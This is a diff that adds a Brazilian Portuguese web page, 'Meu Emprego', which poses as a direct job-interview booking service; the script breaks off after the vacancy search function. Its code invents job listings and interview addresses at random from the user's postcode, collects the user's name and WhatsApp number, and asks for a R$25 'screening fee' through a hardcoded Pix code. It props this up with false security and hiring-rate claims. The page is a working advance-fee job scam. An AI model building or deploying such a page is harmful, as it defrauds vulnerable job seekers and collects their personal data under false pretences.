@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meu Emprego - Agendamento Direto</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --success: #16a34a;
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --highlight: #eff6ff;
+            --warning-bg: #fffbeb;
+            --warning-border: #fde68a;
+            --warning-text: #d97706;
+        }
+        body {
+            font-family: 'Inter', sans-serif; background-color: var(--bg);
+            color: var(--text-main); margin: 0; padding: 0;
+            display: flex; flex-direction: column; min-height: 100vh;
+        }
+        
+        /* Cabeçalho */
+        header {
+            background: #ffffff; border-bottom: 1px solid var(--border);
+            padding: 15px 0; position: sticky; top: 0; z-index: 100;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.05);
+        }
+        .nav-container {
+            max-width: 900px; margin: 0 auto; display: flex;
+            justify-content: space-between; align-items: center; padding: 0 20px;
+        }
+        .logo { 
+            font-size: 20px; font-weight: 800; color: var(--primary); 
+            display: flex; align-items: center; gap: 8px; cursor: pointer; 
+        }
+        
+        /* Menu Superior Modificado para Maior Destaque */
+        .nav-links { display: flex; gap: 12px; }
+        .nav-links button {
+            background: var(--highlight); 
+            color: var(--primary); 
+            border: 1px solid var(--primary);
+            padding: 8px 16px; 
+            border-radius: 20px; 
+            cursor: pointer; 
+            font-size: 14px; 
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        .nav-links button:hover { 
+            background: var(--primary); 
+            color: #ffffff; 
+            transform: translateY(-1px);
+        }
+
+        /* Conteúdo Principal */
+        main { flex: 1; display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px; }
+        .container {
+            background-color: var(--card); max-width: 650px; width: 100%;
+            padding: 35px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            border: 1px solid #f1f5f9;
+        }
+
+        h1 { color: var(--text-main); text-align: center; margin-top: 0; font-size: 26px; font-weight: 800; }
+        h2 { color: var(--text-main); font-size: 20px; margin-top: 0; }
+        h3 { color: var(--primary); font-size: 16px; margin: 0 0 10px 0; }
+        .subtitle { text-align: center; color: var(--text-muted); margin-bottom: 30px; font-size: 15px; }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: var(--text-main); }
+        input[type="text"], input[type="tel"] {
+            width: 100%; padding: 14px; border: 1px solid var(--border);
+            border-radius: 8px; box-sizing: border-box; font-size: 16px;
+            transition: border-color 0.3s, box-shadow 0.3s; outline: none;
+        }
+        input[type="text"]:focus, input[type="tel"]:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+        
+        .info-text { font-size: 13px; color: var(--text-muted); margin-top: 6px; display: flex; align-items: center; gap: 5px; }
+        .info-text svg { color: var(--success); }
+
+        /* Botões */
+        .btn-main {
+            width: 100%; padding: 15px; background-color: var(--primary); color: white;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px;
+        }
+        .btn-main:hover { background-color: var(--primary-dark); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(37,99,235,0.2); }
+        .btn-success { background-color: var(--success); }
+        .btn-success:hover { background-color: #15803d; box-shadow: 0 4px 12px rgba(22,163,74,0.2); }
+        
+        .btn-disabled { background-color: #e2e8f0 !important; color: #94a3b8 !important; cursor: not-allowed !important; box-shadow: none !important; transform: none !important; }
+
+        #step-vagas, #step-pix, #detalhes-selecao { display: none; }
+        
+        /* Cards */
+        .vaga-card {
+            border: 2px solid var(--border); border-radius: 12px; padding: 18px; margin-bottom: 15px;
+            cursor: pointer; transition: all 0.2s; background: white;
+        }
+        .vaga-card:hover { border-color: #bfdbfe; box-shadow: 0 4px 15px rgba(0,0,0,0.03); transform: translateY(-2px); }
+        .vaga-card.selecionada { border-color: var(--primary); background-color: var(--highlight); }
+        
+        .vaga-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px; }
+        .vaga-titulo-box { display: flex; align-items: center; gap: 10px; }
+        .vaga-icon { background: #dbeafe; color: var(--primary); padding: 8px; border-radius: 8px; display: flex; }
+        
+        .vaga-resumo h3 { font-size: 17px; color: var(--text-main); font-weight: 700; margin: 0; }
+        .vaga-resumo p { margin: 4px 0 0 0; color: var(--text-muted); font-size: 14px; font-weight: 500; }
+        
+        .badge { background: #dcfce7; color: #166534; font-size: 11px; font-weight: 700; padding: 4px 8px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px;}
+        
+        .detalhes-box {
+            background: #f8fafc; border: 1px solid var(--border); border-radius: 12px;
+            padding: 25px; margin-top: 25px; animation: fadeIn 0.4s;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .detalhe-item { margin-bottom: 15px; }
+        .detalhe-item strong { color: var(--text-main); font-size: 14px; }
+        .detalhe-item p, .detalhe-item ul { margin: 5px 0 0 0; color: var(--text-muted); font-size: 14px; line-height: 1.6; }
+        .detalhe-item ul { padding-left: 20px; }
+
+        .radio-horarios { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 10px; }
+        .radio-horarios label {
+            flex: 1; min-width: 180px; background: white; padding: 14px; border: 2px solid var(--border);
+            border-radius: 10px; text-align: center; cursor: pointer; font-weight: 600; color: var(--text-muted);
+            transition: all 0.2s; font-size: 14px;
+        }
+        .radio-horarios input { display: none; } 
+        .horario-label.selecionado { border-color: var(--primary); background: var(--highlight); color: var(--primary); }
+
+        .pix-box { text-align: center; padding: 25px; border: 2px solid #bbf7d0; border-radius: 12px; margin-top: 20px; background: #f0fdf4; }
+        .pix-code { background: #ffffff; padding: 15px; word-break: break-all; border: 1px solid var(--border); border-radius: 8px; font-family: monospace; margin: 15px 0; font-size: 14px; user-select: all; color: var(--text-main); }
+
+        .payment-status {
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            margin-top: 20px; padding: 15px; background: var(--warning-bg);
+            border: 1px solid var(--warning-border); border-radius: 8px;
+            color: var(--warning-text); font-weight: 600; font-size: 14px;
+        }
+        .spinner { width: 18px; height: 18px; border: 3px solid var(--warning-border); border-top: 3px solid var(--warning-text); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .trust-badges { display: flex; justify-content: center; gap: 20px; margin-top: 15px; font-size: 12px; color: var(--text-muted); font-weight: 500; }
+        .trust-badges span { display: flex; align-items: center; gap: 5px; }
+
+        /* Modais */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.7); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(4px);
+        }
+        .modal-content {
+            background: white; width: 90%; max-width: 600px; max-height: 85vh;
+            border-radius: 16px; padding: 35px; position: relative; overflow-y: auto;
+            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
+        }
+        .modal-close {
+            position: absolute; top: 20px; right: 20px; font-size: 24px;
+            cursor: pointer; color: var(--text-muted); border: none; background: #f1f5f9;
+            width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.2s;
+        }
+        .modal-close:hover { background: #e2e8f0; color: #ef4444; }
+        .modal-body h2 { font-size: 22px; font-weight: 800; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 20px; }
+        .modal-body p, .modal-body li { line-height: 1.6; color: var(--text-muted); font-size: 14px; }
+        
+        /* Rodapé Atualizado */
+        footer { background: #0f172a; color: #94a3b8; padding: 40px 20px 20px 20px; font-size: 13px; }
+        .footer-grid { max-width: 900px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; margin-bottom: 30px; }
+        .footer-col h4 { color: white; font-size: 15px; margin-bottom: 15px; text-align: left; }
+        .footer-col a { display: block; color: #94a3b8; text-decoration: none; margin-bottom: 8px; cursor: pointer; transition: 0.2s; }
+        .footer-col a:hover { color: white; }
+        .footer-bottom { border-top: 1px solid #1e293b; padding-top: 20px; text-align: center; }
+
+        @media (max-width: 600px) {
+            .nav-container { flex-direction: column; gap: 15px; }
+            .nav-links { flex-wrap: wrap; justify-content: center; gap: 8px; }
+            .nav-links button { font-size: 12px; padding: 6px 12px; }
+            .container { padding: 25px; margin-top: 20px; border-radius: 12px; }
+            .trust-badges { flex-direction: column; align-items: center; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- CABEÇALHO -->
+<header>
+    <div class="nav-container">
+        <div class="logo">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
+            Meu Emprego
+        </div>
+        <div class="nav-links">
+            <button onclick="abrirModal('modal-como-funciona')">Como Funciona</button>
+            <button onclick="abrirModal('modal-dicas')">Dicas de Entrevista</button>
+            <button onclick="abrirModal('modal-curriculo')">Dicas de Currículo</button>
+        </div>
+    </div>
+</header>
+
+<main>
+    <div class="container">
+        <h1>Agendamento de Entrevista</h1>
+        <p class="subtitle">Conectando você diretamente às empresas que estão contratando hoje.</p>
+
+        <!-- PASSO 1: CEP -->
+        <div id="step-cep">
+            <div class="form-group">
+                <label for="cep">Digite o CEP da sua região:</label>
+                <input type="text" id="cep" placeholder="Ex: 28010-120" maxlength="9" oninput="formatarCEP(this)">
+            </div>
+            <button class="btn-main" onclick="buscarVagas()">
+                Buscar Vagas Próximas
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+            </button>
+            <div class="trust-badges">
+                <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg> Seus dados estão seguros</span>
+            </div>
+        </div>
+
+        <!-- PASSO 2: ESCOLHA A VAGA -->
+        <div id="step-vagas">
+            <h2 style="text-align: left; font-weight: 800; font-size: 22px;">Vagas Abertas na sua Região</h2>
+            <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Selecione uma oportunidade abaixo para agendar diretamente com o recrutador.</p>
+            
+            <div id="lista-vagas"></div>
+
+            <div id="detalhes-selecao" class="detalhes-box">
+                <h3 id="detalhe-titulo" style="font-size: 18px; font-weight: 800;"></h3>
+                
+                <div class="detalhe-item"><strong>📍 Endereço da Entrevista:</strong><p id="detalhe-endereco"></p></div>
+                <div class="detalhe-item"><strong>📝 Atividades Básicas:</strong><p id="detalhe-desc"></p></div>
+                <div class="detalhe-item"><strong>🎁 Benefícios Inclusos:</strong><p id="detalhe-beneficios"></p></div>
+                <div class="detalhe-item"><strong>✅ Requisitos:</strong><ul id="detalhe-exigencias"></ul></div>
+
+                <hr style="border: 1px solid var(--border); margin: 25px 0;">
+
+                <div class="form-group">
+                    <label style="font-size: 16px;">1. Escolha o dia e horário na agenda do RH:</label>
+                    <div class="radio-horarios" id="opcoes-horarios"></div>
+                </div>
+
+                <div class="form-group" style="margin-top: 25px;">
+                    <label for="nome" style="font-size: 16px;">2. Como devemos chamar você?</label>
+                    <input type="text" id="nome" placeholder="Digite seu nome completo" oninput="checarPreenchimento()">
+                </div>
+
+                <div class="form-group" style="margin-top: 20px;">
+                    <label for="whatsapp" style="font-size: 16px;">3. Seu WhatsApp (DDD + Número):</label>
+                    <input type="tel" id="whatsapp" placeholder="(11) 99999-9999" maxlength="15" oninput="formatarWhatsApp(this)">
+                    <div class="info-text">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        Você receberá a confirmação da entrevista neste número após o pagamento.
+                    </div>
+                </div>
+
+                <button id="btn-confirmar" class="btn-main btn-success btn-disabled" disabled onclick="confirmarAgendamento()">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                    Confirmar Horário e Pagar Taxa
+                </button>
+            </div>
+        </div>
+
+        <!-- PASSO 3: PAGAMENTO PIX -->
+        <div id="step-pix">
+            <h2 style="color: var(--success); text-align: center; font-weight: 800; font-size: 24px;">Horário Pré-Reservado!</h2>
+            <p style="text-align: center; font-size: 16px; color: var(--text-main);">Excelente escolha, <strong><span id="nome-confirmacao"></span></strong>!</p>
+            <p style="text-align: center; color: var(--text-muted); font-size: 15px;">A vaga de <strong><span id="vaga-confirmacao"></span></strong> está quase garantida. O RH reservou seu horário para <strong style="color: var(--text-main);"><span id="horario-confirmacao"></span></strong>.</p>
+            
+            <div class="pix-box">
+                <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Taxa de Triagem</h3>
+                <p style="font-size: 14px; margin-top: 0; color: var(--text-muted);">Efetue o pagamento de <strong>R$ 25,00</strong> para confirmar sua presença e evitar ausências na agenda da empresa.</p>
+                
+                <div class="pix-code" id="codigo-pix">00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/1025d135934d49698172b7327a82db845204000053039865802BR5911Z TECH LTDA6009SAO PAULO62070503***6304B490</div>
+                
+                <button class="btn-main" onclick="copiarPix()">Copiar Código Pix Copia e Cola</button>
+
+                <div class="trust-badges" style="margin-top: 15px;">
+                    <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Pagamento seguro via Banco Central do Brasil</span>
+                </div>
+
+                <div class="payment-status">
+                    <div class="spinner"></div>
+                    <span>Aguardando identificação do Pix...</span>
+                </div>
+            </div>
+            
+            <div style="background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center;">
+                <p style="margin: 0; font-size: 14px; color: var(--text-main); display: flex; align-items: center; justify-content: center; gap: 8px;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                    <strong>Atenção:</strong> Assim que o pagamento for aprovado, o comprovante e as instruções de chegada serão enviados para o seu WhatsApp cadastrado.
+                </p>
+            </div>
+        </div>
+    </div>
+</main>
+
+<!-- RODAPÉ ATUALIZADO -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <div class="logo" style="color: white; margin-bottom: 15px; font-size: 18px;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
+                Meu Emprego Ltda.
+            </div>
+            <p style="margin-top:0;">Democratizando o acesso ao mercado de trabalho através de tecnologia e agendamentos diretos.</p>
+        </div>
+        <div class="footer-col">
+            <h4>Institucional</h4>
+            <a onclick="abrirModal('modal-termos')">Termos de Uso</a>
+            <a onclick="abrirModal('modal-privacidade')">Política de Privacidade</a>
+            <a onclick="abrirModal('modal-contato')">Fale Conosco</a>
+        </div>
+        <div class="footer-col">
+            <h4>Segurança</h4>
+            <p>🔒 Ambiente 100% Seguro</p>
+            <p>Criptografia de Ponta a Ponta</p>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>Meu Emprego Ltda. | CNPJ: 57.277.786/0001-06</p>
+        <p>Sede Administrativa: Piracicaba, SP</p>
+        <p style="margin-top: 15px; font-size: 11px;">© 2026 Meu Emprego Ltda. Todos os direitos reservados.</p>
+    </div>
+</footer>
+
+<!-- MODAIS: INSTITUCIONAIS -->
+<div id="modal-termos" class="modal-overlay" onclick="fecharModalFora(event, 'modal-termos')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-termos')">&times;</button><div class="modal-body">
+        <h2>Termos de Uso</h2>
+        <p>A plataforma Meu Emprego atua como uma facilitadora tecnológica de agendamentos entre candidatos e setores de Recursos Humanos.</p>
+        <p>1. A taxa de triagem de R$ 25,00 é destinada à manutenção dos servidores e garantia de comparecimento (evitando ausências nas agendas das empresas parceiras).</p>
+        <p>2. O agendamento da entrevista não caracteriza promessa de emprego, sendo a contratação de responsabilidade exclusiva da empresa ofertante após avaliação presencial.</p>
+    </div></div>
+</div>
+
+<div id="modal-privacidade" class="modal-overlay" onclick="fecharModalFora(event, 'modal-privacidade')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-privacidade')">&times;</button><div class="modal-body">
+        <h2>Política de Privacidade</h2>
+        <p>Protegemos seus dados rigorosamente de acordo com a Lei Geral de Proteção de Dados (LGPD).</p>
+        <p>Os dados inseridos (CEP, Nome e WhatsApp) são utilizados exclusivamente para o mapeamento da vaga e envio do comprovante de entrevista. Não comercializamos informações com terceiros, nem armazenamos dados bancários, uma vez que o pagamento é processado via ecossistema Pix do Banco Central.</p>
+    </div></div>
+</div>
+
+<div id="modal-contato" class="modal-overlay" onclick="fecharModalFora(event, 'modal-contato')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-contato')">&times;</button><div class="modal-body">
+        <h2>Fale Conosco</h2>
+        <p>Precisa de ajuda com o seu agendamento?</p>
+        <p><strong>E-mail Corporativo:</strong> suporte@meuemprego.com.br</p>
+        <p><strong>Horário de Atendimento:</strong> Segunda a Sexta, das 09h às 18h.</p>
+        <p><em>Nosso time responde a todos os chamados em até 24 horas úteis.</em></p>
+    </div></div>
+</div>
+
+<!-- MODAIS: AJUDA AO CANDIDATO -->
+<div id="modal-como-funciona" class="modal-overlay" onclick="fecharModalFora(event, 'modal-como-funciona')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-como-funciona')">&times;</button><div class="modal-body">
+        <h2>Como Funciona?</h2>
+        <p>O mercado mudou. Ficar enviando currículos para e-mails que ninguém lê não funciona mais.</p>
+        <div style="background: var(--highlight); padding: 15px; border-left: 4px solid var(--primary); border-radius: 4px; margin: 20px 0;">
+            <strong style="color: var(--primary-dark);">📊 Dados de Contratação:</strong>
+            <p style="margin: 5px 0 0 0; font-size: 14px;">A cada 10 candidatos que realizam entrevista presencial, 6 são contratados! O contato visual prova atitude e vontade.</p>
+        </div>
+        <p><strong>1.</strong> Busque usando o CEP da sua região.</p>
+        <p><strong>2.</strong> Escolha o dia e horário direto na agenda da empresa.</p>
+        <p><strong>3.</strong> Pague a taxa simbólica de triagem (R$ 25,00). Ela cobre custos do sistema e prova para o RH que você tem compromisso e vai comparecer.</p>
+    </div></div>
+</div>
+
+<div id="modal-dicas" class="modal-overlay" onclick="fecharModalFora(event, 'modal-dicas')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-dicas')">&times;</button><div class="modal-body">
+        <h2>Dicas de Entrevista</h2>
+        <ul>
+            <li><strong>Chegue 15 min antes:</strong> Mostra pontualidade e organização.</li>
+            <li><strong>Vestimenta:</strong> Roupas neutras, calça jeans limpa e sapato fechado.</li>
+            <li><strong>Celular:</strong> Sempre no modo avião durante a conversa.</li>
+            <li><strong>Seja sincero:</strong> Se não sabe fazer algo, diga "Ainda não sei, mas aprendo rápido". Atitude vale mais que currículo.</li>
+        </ul>
+    </div></div>
+</div>
+
+<div id="modal-curriculo" class="modal-overlay" onclick="fecharModalFora(event, 'modal-curriculo')">
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-curriculo')">&times;</button><div class="modal-body">
+        <h2>Como fazer o Currículo</h2>
+        <p>Leve o documento impresso e sem amassados no dia agendado.</p>
+        <ul>
+            <li><strong>Dados no topo:</strong> Nome, Idade, Bairro e WhatsApp.</li>
+            <li><strong>Objetivo:</strong> Diga qual vaga você quer. Nada de textos longos.</li>
+            <li><strong>Experiência:</strong> Da mais recente para a mais antiga.</li>
+        </ul>
+        <p style="color: #ef4444; font-weight: 600; font-size: 13px;">Atenção: Revise a ortografia. Erros de português eliminam o candidato imediatamente.</p>
+    </div></div>
+</div>
+
+<script>
+    // UX: Formatação automática do CEP
+    function formatarCEP(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 5) value = value.replace(/^(\d{5})(\d)/, '$1-$2');
+        input.value = value;
+    }
+
+    // UX: Formatação automática do WhatsApp
+    function formatarWhatsApp(input) {
+        let v = input.value.replace(/\D/g, '');
+        if (v.length > 11) v = v.slice(0, 11);
+        if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
+        if (v.length > 7) v = v.replace(/(\d{5})(\d)/, '$1-$2');
+        input.value = v;
+        checarPreenchimento();
+    }
+
+    // UX: Trava do botão
+    function checarPreenchimento() {
+        const horario = document.querySelector('input[name="horario_escolhido"]:checked');
+        const nome = document.getElementById('nome').value.trim();
+        const whatsappNumeros = document.getElementById('whatsapp').value.replace(/\D/g, '');
+        const btn = document.getElementById('btn-confirmar');
+        
+        if (horario && nome.length > 2 && whatsappNumeros.length >= 10) {
+            btn.disabled = false;
+            btn.classList.remove('btn-disabled');
+        } else {
+            btn.disabled = true;
+            btn.classList.add('btn-disabled');
+        }
+    }
+
+    // Modais
+    function abrirModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function fecharModal(id) { document.getElementById(id).style.display = 'none'; }
+    function fecharModalFora(event, id) { if (event.target === document.getElementById(id)) fecharModal(id); }
+
+    // Pix
+    function copiarPix() {
+        const textoPix = document.getElementById("codigo-pix").innerText;
+        navigator.clipboard.writeText(textoPix).then(() => {
+            alert("Código Pix copiado! Cole no app do banco.");
+        }).catch(err => { alert("Erro ao copiar. Copie manualmente."); });
+    }
+
+    // Banco de Vagas
+    const profissoes = [
+        { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento, demonstração de produtos e fechamento.", exigencias: ["Ensino médio completo", "Boa comunicação"] },
+        { titulo: "Porteiro / Vigia", salario: "R$ 1.950,00", beneficios: "Cesta Básica + Adicional Noturno", desc: "Controle de acesso de visitantes e monitoramento.", exigencias: ["Atenção aos detalhes", "Escala 12x36"] },
+        { titulo: "Vigilante Patrimonial", salario: "R$ 2.200,00", beneficios: "VR (R$ 30/dia) + Seguro de Vida + VT", desc: "Zelo pelo patrimônio e rondas periódicas.", exigencias: ["Curso ATA atualizado", "Responsabilidade"] },
+        { titulo: "Repositor de Mercadorias", salario: "R$ 1.620,00", beneficios: "Refeição + Plano Odonto + VT", desc: "Abastecimento e controle de validade nas gôndolas.", exigencias: ["Disposição física", "Agilidade"] },
+        { titulo: "Caixa Atendente", salario: "R$ 1.750,00", beneficios: "Quebra de Caixa (10%) + VA + VT", desc: "Registro de mercadorias e recebimento de valores.", exigencias: ["Atenção com troco", "Simpatia no atendimento"] }
+    ];
+
+    const pacotesDeHorarios = [
+        [{ dia: "Segunda-feira", hora: "09:00" }, { dia: "Quarta-feira", hora: "14:30" }],
+        [{ dia: "Terça-feira", hora: "10:00" }, { dia: "Quinta-feira", hora: "15:00" }],
+        [{ dia: "Quarta-feira", hora: "08:30" }, { dia: "Sexta-feira", hora: "16:00" }],
+        [{ dia: "Quinta-feira", hora: "11:00" }, { dia: "Segunda-feira", hora: "13:30" }],
+        [{ dia: "Sexta-feira", hora: "09:30" }, { dia: "Terça-feira", hora: "14:00" }]
+    ];
+
+    // BANCO DE DADOS REGIONALIZADO EXPANDIDO
+    const dadosLocaisPorCidade = {
+        "Rio de Janeiro": { predios: ["Centro Empresarial Botafogo", "Tower 244", "RB1 - Rio Branco 1", "Edifício CEO Corporate"], ruas: ["Avenida Rio Branco", "Av. Presidente Vargas", "Rua da Assembleia"], bairros: ["Centro", "Botafogo"] },
+        "Campos dos Goytacazes": { predios: ["Centro Empresarial Pelinca", "Medical Center", "Prime Offices", "Edifício Salete"], ruas: ["Avenida Pelinca", "Av. Vinte e Oito de Março", "Rua Voluntários da Pátria"], bairros: ["Centro", "Parque Pelinca"] },
+        "Vitória": { predios: ["Enseada Trade Center", "Palácio do Café", "Global Tower", "Shopping Vitória Empresarial"], ruas: ["Av. Nossa Senhora da Penha", "Av. Américo Buaiz"], bairros: ["Enseada do Suá", "Centro"] },
+        "São Paulo": { predios: ["Birmann 21", "Rochaverá Corporate", "CENU", "Edifício Itália", "Paulista Corporate"], ruas: ["Avenida Paulista", "Avenida Faria Lima", "Av. Engenheiro Luís Carlos Berrini"], bairros: ["Centro", "Itaim Bibi", "Pinheiros"] },
+        "Belo Horizonte": { predios: ["Savassi Corporate", "Boulevard Corporate Tower", "Edifício Amadeus", "Tech Tower"], ruas: ["Avenida Afonso Pena", "Avenida Contorno", "Rua da Bahia"], bairros: ["Savassi", "Centro", "Lourdes"] },
+        "PadraoBrasil": { 
+            predios: [
+                "Edifício Corporate Center", "Centro Empresarial Executive", "Galeria Comercial Plaza", 
+                "Tower Office Business", "Prime Business Center", "Edifício Trade", 
+                "Complexo Empresarial", "Plaza Corporate", "Global Offices", 
+                "Medical & Business Center", "Edifício Metropolitan", "Centro Executivo"
+            ], 
+            ruas: [
+                "Avenida Central", "Rua do Comércio", "Avenida Principal", 
+                "Rua Empresarial", "Avenida Comercial", "Rua das Indústrias", 
+                "Avenida Brasil", "Rua Quinze de Novembro", "Avenida Independência"
+            ], 
+            bairros: [
+                "Centro", "Setor Comercial", "Distrito de Negócios", 
+                "Jardim América", "Centro Empresarial", "Zona Central"
+            ] 
+        }
+    };
+
+    let vagasAtivas = [];
+
+    async function buscarVagas() {
+        const cepInput = document.getElementById('cep').value.replace(/\D/g, '');
+        if (cepInput.length !== 8) { alert("Informe um CEP de 8 dígitos."); return; }
+
+        try {
+            const btnBusca = document.querySelector('#step-cep .btn-main');
+            const textoOriginal = btnBusca.innerHTML;
+            btnBusca.innerText = "Sincronizando banco de vagas...";
+            btnBusca.disabled = true;
+
+            const response = await fetch(`https://viacep.com.br/ws/${cepInput}/json/`);
+            const data = await response.json();
+            
+            btnBusca.innerHTML = textoOriginal;
+            btnBusca.disabled = false;
+
+            if (data.erro) { alert("CEP inválido ou não localizado."); return; }
+
+            const cidade = data.localidade;
+            const ufReal = data.uf;
+
+            let dadosLocais = dadosLocaisPorCidade[cidade] || dadosLocaisPorCidade["PadraoBrasil"];
+
+            const profsSorteadas = profissoes.sort(() => 0.5 - Math.random()).slice(0, 3);
+            const horariosSorteados = pacotesDeHorarios.sort(() => 0.5 - Math.random()).slice(0, 3);
+
+            vagasAtivas = [];
+            let vagasHtml = '';
+
+            profsSorteadas.forEach((vaga, index) => {
+                const predio = dadosLocais.predios[Math.floor(Math.random() * dadosLocais.predios.length)];
+                const rua = dadosLocais.ruas[Math.floor(Math.random() * dadosLocais.ruas.length)];
+                const bairro = dadosLocais.bairros[Math.floor(Math.random() * dadosLocais.bairros.length)];
+                
+                const endereco = `${rua}, ${Math.floor(Math.random() * 800) + 10} - ${predio}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairro}, ${cidade} - ${ufReal}`;
+                
+                vagasAtivas.push({ ...vaga, endereco: endereco, horarios: horariosSorteados[index] });
+
+                vagasHtml += `
+                    <div class="vaga-card" id="card-${index}" onclick="selecionarVaga(${index})">
+                        <div class="vaga-header">
+                            <div class="vaga-titulo-box">
+                                <div class="vaga-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
+                                <div class="vaga-resumo">
+                                    <h3>${vaga.titulo}</h3>
+                                    <p>${vaga.salario}</p>
+                                </div>
+                            </div>
+                            <span class="badge">Urgente</span>
+                        </div>
+                    </div>
+                `;
+            });
+
+            document.getElementById('lista-vagas').innerHTML = vagasHtml;
+            document.getElementById('step-cep').style.display = 'none';
+            document.getElementById('step-vagas').style.display = 'block';
+        } catch (error) {
+            document.querySelector('#step-cep .btn-main').innerText = "Ver Vagas Próximas";
+            document.querySelector('#step-cep .btn-main').disabled = false;
+            alert("Erro de conexão. Verifique sua internet e tente novamente.");
+        }
+    }
+
